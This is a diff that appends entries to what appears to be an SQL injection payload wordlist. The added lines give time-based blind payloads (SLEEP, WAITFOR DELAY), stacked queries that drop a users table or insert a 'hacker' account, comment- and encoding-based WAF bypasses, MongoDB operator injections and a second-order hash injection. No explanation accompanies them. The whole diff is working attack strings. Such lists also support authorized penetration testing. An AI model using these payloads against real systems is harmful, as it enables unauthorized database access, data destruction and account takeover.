@@ -374,3 +374,26 @@ admin' || '1'=='1
 ' AND 1=(SELECT 1 FROM pg_sleep(5))--
 ' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
 ' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
+# Time-based blind
+' AND SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+" AND SLEEP(5)--
+' WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'--
+# Stacked queries
+'; DROP TABLE users--
+'; INSERT INTO users VALUES ('hacker','pass')--
+'; SELECT @@version--
+# WAF bypass
+'/**/OR/**/1=1--
+'/*!50000OR*/1=1--
+SEL/**/ECT 1
+uni/**/on sel/**/ect 1,2,3
+%55NION%53ELECT 1
+# NoSQL injection (MongoDB)
+{"$ne": null}
+{"$gt": ""}
+{"$regex": "^a"}
+{"$where": "sleep(5000)"}
+# Second order
+' UNION SELECT 'admin','$2b$12$...',1,2-- (hash injection)
